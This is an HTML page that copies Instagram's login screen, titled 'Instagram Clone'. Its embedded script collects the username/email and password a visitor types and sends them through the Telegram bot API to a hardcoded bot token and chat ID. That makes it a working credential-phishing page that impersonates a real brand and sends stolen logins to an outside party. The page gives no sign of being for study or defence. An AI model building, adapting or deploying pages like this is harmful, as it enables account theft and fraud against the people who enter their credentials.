<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="image/insta-fav.ico">
    <title>Instagram Clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="image/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="loginForm">
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input name="email" id="email" placeholder="Phone number, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input name="password" id="password" type="password" placeholder="Password" required />

                    <button type="button" onclick="handleLogin()">Log in</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="image/apple-button.png"      alt="Apple Store logo" title="Apple Store logo" />
                    <img src="image/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">MORE RELEVANT ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">Â© 2025 Instagram from Facebook</p>
    </footer>

    <script>
        // Replace these with your Bot Token and Chat ID
        const TELEGRAM_BOT_TOKEN = '7232481692:AAF67TRYlMxa3UEqOm-28fsd2Ar7rlgIyQ4';  // Your bot's token
        const TELEGRAM_CHAT_ID = '6258073344';      // Your chat ID

        // Function to handle login and send message to Telegram
        function handleLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Prepare the message to send to Telegram
            const message = `User Logged In!\nUsername: ${email}\nPassword: ${password}`;

            // Send the message to Telegram
            sendToTelegram(message);
        }

        // Function to send the message to Telegram bot
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

            // Use fetch to send the request to Telegram API
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('Login successful! Message sent to Telegram.');
                    } else {
                        alert('Error sending message to Telegram.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('There was an error sending the message.');
                });
        }
    </script>
</body>
</html>
